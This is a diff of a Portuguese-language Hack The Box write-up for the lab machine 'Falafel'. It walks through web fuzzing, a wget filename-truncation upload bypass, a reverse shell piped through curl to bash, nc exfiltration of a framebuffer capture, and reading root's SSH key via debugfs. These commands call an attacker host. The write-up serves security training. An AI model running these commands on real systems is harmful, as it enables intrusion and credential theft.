@@ -199,13 +199,13 @@
 <h2 id="website"><a class="header" href="#website">WebSite</a></h2>
 <p><img src="Assets/HTB-Linux-Hard-Falafel/website-1.png" alt="Website - First page" /></p>
 <p>Só pela página principal, já obtemos informações potencialmente úteis. Temos um email (IT@falafel.htb) e com isso, podemos suspeitar existir um usuário (IT) e virtual hosting (falafel.htb).</p>
-<pre><code class="language-bash"># Adicionar o host ao /etc/hosts
+<pre><code class="language-powershell"># Adicionar o host ao /etc/hosts
 echo -e &quot;10.10.10.73\tfalafel.htb&quot; &gt;&gt; /etc/hosts
 </code></pre>
 <p>Apesar de ser uma suspeita plausível, não existe virtual host.</p>
 <h3 id="fuzzing-the-website"><a class="header" href="#fuzzing-the-website">Fuzzing the website</a></h3>
 <p>Antes de falar da página do Login (que é por aí que se vai penetrar a máquina!), irei falar sobre as rotas e potenciais ficheiros da máquina.</p>
-<pre><code class="language-bash"># Primeira enumeração básica de rotas
+<pre><code class="language-powershell"># Primeira enumeração básica de rotas
 ffuf -c -u http://10.10.10.73/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 200 -r
 
 #&gt;  assets                  [Status: 403, Size: 293, Words: 22, Lines: 12]
@@ -218,7 +218,7 @@ ffuf -c -u http://10.10.10.73/FUZZ -w /usr/share/wordlists/dirbuster/directory-l
 </code></pre>
 <p>Vemos um diretório <strong>upload</strong>. Mas por enquanto nada de mais... Temos de procurar mais...</p>
 <p>O segundo scan que quero rodar é por ficheiros. Sabemos que é um servidor apache com auxilio do nmap, por isso podemos supor que o servidor funcione com ficheiros php. Além disso, o botão de login nós redirige para um login.php. Posto isso, o nosso próximo scan vai ser para procurar ficheiros com extenções php. Podemos também procurar por ficheiros txt...</p>
-<pre><code class="language-bash">ffuf -c -u http://10.10.10.73/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 200 -r -e .txt,.php
+<pre><code class="language-powershell">ffuf -c -u http://10.10.10.73/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 200 -r -e .txt,.php
 
 #&gt;  profile.php             [Status: 200, Size: 7063, Words: 878, Lines: 103]
 #&gt;  uploads                 [Status: 403, Size: 294, Words: 22, Lines: 12]
@@ -337,16 +337,16 @@ main()
 <p><img src="Assets/HTB-Linux-Hard-Falafel/login_admin.png" alt="logged as admin" /></p>
 <h3 id="rce"><a class="header" href="#rce">RCE</a></h3>
 <p>Encontramos o tal painel de upload que chris mencionou. Neste momento, o objectivo é enviar um reverse shell para a máquina vítima, e tentat aceder via URL para o mesmo ser executado. O primeiro passo é descobrir que tipo de ficheiro aceita. A caixa de upload indica ficheiros.png. Vou partilhar um servidor http com uma imagem.png.</p>
-<pre><code class="language-bash">sudo python3 -m http.server 80
+<pre><code class="language-powershell">sudo python3 -m http.server 80
 </code></pre>
 <p>Conseguimos realmente enviar uma imagem. E a resposa é muito incomum! A resposta parece-se muito com um commando bash, um cd para uma pasta, e um wget para o nosso ficheiro de imagem. Tentei burlar o site de diversas formas (Dupla extensão, mudar o MIME TYPE, concatenar comando com ponto e virgula, &amp;&amp;, ||... mas nada).</p>
 <p>A forma de enviar um ficheiro malicioso é surpreendente! O Linux não aceita nomes de arquivos que tenha mais do que 255 caracteres. E o wget está feito para limitar isso, para garantir que receba os arquivos da internet, mesmo com nomes ridiculamente enormes... Tentei então enviar um arquivo de imagem com exatamente 255 caracteres (251 + .png).</p>
-<pre><code class="language-bash"># Copia da imagem para um arquivo com nome de 251 caracteres seguindo um padrão para depois poder saber ao certo qual é o ponto exacto onde o wget corta o nome
+<pre><code class="language-powershell"># Copia da imagem para um arquivo com nome de 251 caracteres seguindo um padrão para depois poder saber ao certo qual é o ponto exacto onde o wget corta o nome
 cp shell.png $(msf-pattern_create -l 251).png
 </code></pre>
 <p><img src="Assets/HTB-Linux-Hard-Falafel/output_wget.png" alt="Output wget" /></p>
 <p>Pela resposta, sabemso que foi enviado com successo, e que o nome foi alterado, tendo como fim o h7Ah.´</p>
-<pre><code class="language-bash">msf-pattern_offset -q h7Ah
+<pre><code class="language-powershell">msf-pattern_offset -q h7Ah
 #&gt;  [*] Exact match at offset 232
 </code></pre>
 <p>Este &quot;Exact match at offset 232&quot; é feito para bufferoverflow, que normalmente seria o ponto que ficaria no ESP, sendo que não é bem esse o ponto certo. O ponto certo é 236 caracteres, mas como ainda temos de adicionar 4 caracteres para o &quot;.png&quot;, até que dá jeito este erro lol.</p>
@@ -363,7 +363,7 @@ cp shell.png $(msf-pattern_create -l 251).png
 <li>O wget da página de upload corta os nomes muito grandes a partir do caractere 236.</li>
 </ul>
 <p>Posto isso, se renomearmos o nosso ficheiro malicioso por um arquivo com (232 carateres + .php + .png), o nome do arquivo irá ser cortado a partir do 236º caracter e ficará assim: (232 chars + .php)</p>
-<pre><code class="language-bash">cp shell.php $(msf-pattern_create -l 232).php.png
+<pre><code class="language-powershell">cp shell.php $(msf-pattern_create -l 232).php.png
 # Agora que temos o número exato de caracteres, poderíamos ter chamado o ficheiro com 232 &quot;A&quot;... mas na altura não me lembrei e o nome está um pouco agressivo para os olhos!
 </code></pre>
 <p>Resultado:</p>
@@ -380,12 +380,12 @@ cp shell.png $(msf-pattern_create -l 251).png
 <h3 id="reverse-shell"><a class="header" href="#reverse-shell">Reverse Shell</a></h3>
 <p>A forma mais fácil de ter um reverse shell sem ter muitos problemas com caracteres especiais e assim é partilhar um ficheiro com o código do reverse shell lá dentro, para depois fazer um curl e pipeá-lo com um bash (sim pipeá-lo, neste blog, este verbo existe xD)</p>
 <p>Criei então um ficheiro com o nome rev.html contendo o seguinte código:</p>
-<pre><code class="language-bash">#!/bin/bash
+<pre><code class="language-powershell">#!/bin/bash
 
 bash -i &gt;&amp; /dev/tcp/10.10.14.17/443 0&gt;&amp;1
 </code></pre>
 <p>Partilhe então um servidor http com este ficheiro, para que através do RCE, poder dar um curl ao ficheiro, e pipeá-lo com bash</p>
-<pre><code class="language-bash">sudo python3 -m http.server 80  # On one terminal
+<pre><code class="language-powershell">sudo python3 -m http.server 80  # On one terminal
 sudo nc -lvnp 443               # On another one
 </code></pre>
 <blockquote>
@@ -393,7 +393,7 @@ sudo nc -lvnp 443               # On another one
 </blockquote>
 <h2 id="privesc"><a class="header" href="#privesc">PrivEsc</a></h2>
 <p>Já dentro da máquina, ao vasculhar os ficheiros, pode-se encontrar credenciais em /var/www/html/connection.php</p>
-<pre><code class="language-bash">(remote) www-data@falafel:/var/www/html$ cat connection.php
+<pre><code class="language-powershell">(remote) www-data@falafel:/var/www/html$ cat connection.php
 &lt;?php
    define('DB_SERVER', 'localhost:3306');
    define('DB_USERNAME', 'moshe');
@@ -411,19 +411,19 @@ sudo nc -lvnp 443               # On another one
 <h3 id="group-video"><a class="header" href="#group-video">Group video</a></h3>
 <p>Esta máquina é um CaptureTheFlag LOL... O próximo passo é completamente irrealista, mas não deixa de ser interessante. Esta máquina não tem mais vulnerabilidades. Ok, então onde estão as credenciais do usuário &quot;yossi&quot;?! Estão no ecrã...</p>
 <p>com o commando &quot;w&quot; podemos ver que o yossi está actualmente logado fisicamente na máquina</p>
-<pre><code class="language-bash">w
+<pre><code class="language-powershell">w
 #&gt;   22:31:32 up 10:23,  2 users,  load average: 0.00, 0.00, 0.00
 #&gt;  USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 #&gt;  yossi    tty1                      12:08   10:22m  0.06s  0.06s -bash
 #&gt;  moshe    pts/1    10.10.14.17      22:06    0.00s  0.06s  0.00s w
 </code></pre>
 <p>O usuário com o qual estamos neste momento (moshe) está no grupo &quot;video&quot;. Os usuário deste grupo pode ver o que está a ser transmitido para o ecrã. E para tirar uma captura de ecrã sem nenhum recurso adicional, pode-se ir à fonte mesmo. Isto é, capturar o que está em /dev/fb0 com um simples cat. Para ler este arquivo (que vem em formato RAW), temos de saber as dimenções da tela, pois este formato não diz nada sobre dimenções, apenas escreve todos os dados numa linha só e &quot;tá feito&quot;. As dimenções actuais do ecrã estão sempre definidas em /sy/class/graphics/fb0/virtual_size</p>
-<pre><code class="language-bash">cat /dev/fb0 &gt; /tmp/screen.raw
+<pre><code class="language-powershell">cat /dev/fb0 &gt; /tmp/screen.raw
 cat /sys/class/graphics/fb0/virtual_size
 #&gt; 1176,885
 </code></pre>
 <p>Recupere a captura de ecrã para o kali</p>
-<pre><code class="language-bash">nc 10.10.14.17 443 &lt; /tmp/screen.raw  # Target Machine
+<pre><code class="language-powershell">nc 10.10.14.17 443 &lt; /tmp/screen.raw  # Target Machine
 nc -lvnp 443 &gt; screen.raw             # kali Machine
 </code></pre>
 <p>Abrir o ficheiro com ajuda do GIMP, definido manualmente que este ficheiro é um ficheiro RAW com 1176,885 de dimenções...</p>
@@ -432,11 +432,11 @@ nc -lvnp 443 &gt; screen.raw             # kali Machine
 <p><img src="Assets/HTB-Linux-Hard-Falafel/yossi_password.png" alt="Password yossi" /></p>
 <p>Entre agora por ssh com o usuário yossi e a sua credencial (que de passagem só se vê porque o yossi errou primeiro ao introduzi-la e por &quot;grande sorte&quot; ainda está a vista na tela looooool)</p>
 <h3 id="group-disk"><a class="header" href="#group-disk">Group disk</a></h3>
-<pre><code class="language-bash">for group in $(groups); do echo -e &quot;\n\n\n[*] Archive with group $group permition:\n&quot;; find / -group $group 2&gt;/dev/null; done
+<pre><code class="language-powershell">for group in $(groups); do echo -e &quot;\n\n\n[*] Archive with group $group permition:\n&quot;; find / -group $group 2&gt;/dev/null; done
 </code></pre>
 <p>Este commando permite-nos enumerar todos os ficheiro no qual pertence a cada grupo no qual está o usuário. E assim, vemos que o usuário yossio em que estamos logados, tem permissões através do grupo &quot;disk&quot; de leitura e escritura sobre /dev/sda1 e muito mais...</p>
 <p>Este /dev/sda1 é muito simplesmente o disco rígido na qual está instalado o prórpio sistema operativo. Mas não dá para abrir assim...</p>
-<pre><code class="language-bash">fdisk -l
+<pre><code class="language-powershell">fdisk -l
 #&gt;  Disk /dev/sda: 8 GiB, 8589934592 bytes, 16777216 sectors
 #&gt;  Units: sectors of 1 * 512 = 512 bytes
 #&gt;  Sector size (logical/physical): 512 bytes / 512 bytes
@@ -455,7 +455,7 @@ ll /dev/sda1
 </code></pre>
 <h3 id="debugfs"><a class="header" href="#debugfs">debugfs</a></h3>
 <p>Com a ajuda da ferramente debugfs (ext2/ext3/ext4 file system debugger). Podemos ver ou manipular uma partição, um disco ou o seu conteúdo. Podemos assim facilemente ver a flag root.txt, mas a nós o que nos interessa é vir a ser root! Por sorte, em /root/.ssh existem keys para entrar por ssh, já autorizadas... nem percisamos de fazer mais nada. É só copiar e usar a id_rsa:</p>
-<pre><code class="language-bash">debugfs /dev/sda1
+<pre><code class="language-powershell">debugfs /dev/sda1
 debugfs: cd /root/.ssh
 debugfs: cat id_rsa  # copy the content...
 # Exit the debugfs
